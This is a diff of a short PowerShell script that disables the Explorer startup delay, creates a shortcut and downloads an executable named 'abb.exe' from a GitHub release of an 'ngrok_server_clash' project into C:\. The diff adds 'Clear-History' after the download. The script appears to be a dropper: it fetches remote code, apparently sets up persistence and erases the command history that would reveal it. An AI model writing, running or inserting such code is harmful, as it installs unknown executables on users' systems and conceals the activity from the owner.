@@ -1,3 +1,4 @@
+
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize" -Name "Startupdelayinmsec" -Value 0 -Type DWord
 
 $WshShell = New-Object -comObject WScript.Shell
@@ -8,3 +9,4 @@ $Shortcut.Save()
 
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile("https://github.com/ZeRo1k/ngrok_server_clash/releases/download/%40private/abb.exe", "C:\abb.exe")
+Clear-History
